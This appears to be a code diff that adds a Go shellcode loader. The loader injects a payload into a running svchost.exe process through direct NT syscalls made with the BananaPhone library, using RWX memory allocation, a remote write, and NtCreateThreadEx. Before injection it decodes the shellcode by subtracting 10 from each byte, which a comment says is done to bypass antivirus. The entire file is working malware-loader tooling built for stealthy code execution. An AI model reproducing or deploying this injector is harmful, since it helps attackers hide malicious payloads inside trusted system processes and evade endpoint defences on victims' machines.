@@ -1,0 +1,179 @@
+type clientID struct {
+	UniqueProcess uintptr
+	UniqueThread  uintptr
+}
+
+type objectAttrs struct {
+	Length                   uintptr
+	RootDirectory            uintptr
+	ObjectName               uintptr
+	Attributes               uintptr
+	SecurityDescriptor       uintptr
+	SecurityQualityOfService uintptr
+}
+
+func findProcess(proc string) int {
+    processList, err := ps.Processes()
+    if err != nil {
+        return -1
+    }
+
+    for x := range processList {
+        var process ps.Process
+        process = processList[x]
+        if process.Executable() != proc {
+            continue
+        }
+        p, errOpenProcess := windows.OpenProcess(
+        	windows.PROCESS_VM_OPERATION, false, uint32(process.Pid()))
+        if errOpenProcess != nil {
+        	continue
+        }
+        windows.CloseHandle(p)
+        return process.Pid()
+    }
+    return 0
+}
+
+
+
+func run(shellcode []byte) {
+	//processName input
+	pid := findProcess("svchost.exe")
+	fmt.Printf("	[*] Injecting into svchost.exe, PID=[%d]\n", pid)
+	if pid == 0 {
+		panic("Cannot find svchost.exe process")
+	}
+
+	// SecCommit is the SEC_COMMIT const from winnt.h
+	const SecCommit = 0x08000000
+
+	// SectionWrite is the SECTION_MAP_WRITE const from winnt.h
+	const SectionWrite = 0x2
+
+	// SectionRead is the SECTION_MAP_READ const from winnt.h
+	const SectionRead = 0x4
+
+	// SectionExecute is the SECTION_MAP_EXECUTE const from winnt.h
+	const SectionExecute = 0x8
+
+	// SectionRWX is the combination of READ, WRITE, and EXECUTE
+	const SectionRWX = SectionWrite | SectionRead | SectionExecute
+
+	// OpenProcess request access rights
+	const requestRights = windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION |
+		windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE |
+		windows.PROCESS_VM_READ | windows.PROCESS_TERMINATE |
+		windows.PROCESS_DUP_HANDLE | 0x001
+
+	//Declare BananaPhone
+	bp, e := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
+	if e != nil {
+		panic(e)
+	}
+	a11oc, e := bp.GetSysID("NtAllocateVirtualMemory")
+	if e != nil {
+		panic(e)
+	}
+	create, e := bp.GetSysID("NtCreateThreadEx")
+	if e != nil {
+		panic(e)
+	}
+	write, e := bp.GetSysID("NtWriteVirtualMemory")
+	if e != nil {
+		panic(e)
+	}
+	ntopen, e := bp.GetSysID("NtOpenProcess")
+	if e != nil {
+		panic(e)
+	}
+
+	var (
+		targetHandle windows.Handle 
+		baseAddress uintptr 
+	)
+	var allocatedSize = uint64(len(shellcode))
+
+	// De-shift the code by 10.
+	// Antivirus detects on the shellcode itself so this will bypass it.
+	for i := range shellcode {
+		shellcode[i] -= 10
+	}
+
+	if pid != 0 {
+		//NtOpenProcess with banana
+		r1, r := bananaphone.Syscall(
+			ntopen,
+			uintptr(unsafe.Pointer(&targetHandle)),
+			requestRights,
+			uintptr(unsafe.Pointer(&objectAttrs{0, 0, 0, 0, 0, 0})),
+			uintptr(unsafe.Pointer(&clientID{uintptr(pid), 0})),
+			0,
+		)
+		defer windows.CloseHandle(targetHandle)
+		if r != nil {
+			fmt.Printf("1 %s %x\n", r, r1)
+			return
+		}
+		fmt.Printf("BananaPhone: Opened PID %d\n", pid)
+	}else{
+		fmt.Println("No Process! ")
+		os.Exit(1)
+	}
+
+	//NtAllocateVirtualMemory
+	r1, r := bananaphone.Syscall(
+		a11oc, //NtAllocateVirtualMemory
+		uintptr(targetHandle),
+		uintptr(unsafe.Pointer(&baseAddress)),
+		0,
+		uintptr(unsafe.Pointer(&allocatedSize)),
+		windows.MEM_COMMIT|windows.MEM_RESERVE,
+		windows.PAGE_EXECUTE_READWRITE,
+	)
+	if r != nil {
+		fmt.Printf("2 %s %x\n", r, r1)
+		return
+	}
+	fmt.Printf("BananaPhone: Allocated %dbytes at 0x%X\n", allocatedSize, baseAddress)
+
+	//NtWriteVirtualMemory
+	r1, r = bananaphone.Syscall(
+		write, //NtWriteVirtualMemory
+		uintptr(targetHandle),
+		uintptr(baseAddress),
+		uintptr(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)),
+		0,
+	)
+	if r != nil {
+		fmt.Printf("3 %s %x\n", r, r1)
+		return
+	}
+
+	fmt.Printf("BananaPhone: Wrote %dbytes at 0x%X\n", len(shellcode), baseAddress)
+
+	// Declare a HANDLE to store the resulting thread HANDLE.
+	var threadHandle uintptr
+
+	//NtCreateThreadEx
+	r1, r = bananaphone.Syscall(
+		create,											//NtCreateThreadEx
+		uintptr(unsafe.Pointer(&threadHandle)),			//hthread
+		windows.GENERIC_EXECUTE,						//desiredaccess
+		0,												//objattributes
+		uintptr(targetHandle),							//processhandle
+		baseAddress,									//lpstartaddress
+		0,												//lpparam
+		0,												//createsuspended
+		0,												//zerobits
+		0,												//sizeofstackcommit
+		0,												//sizeofstackreserve
+		0,												//lpbytesbuffer
+	)
+	if r != nil {
+		fmt.Printf("4 %s %x\n", r, r1)
+		return
+	}
+	fmt.Printf("BananaPhone: Execute 0x%X code at 0x%X\n", threadHandle, baseAddress)
+}
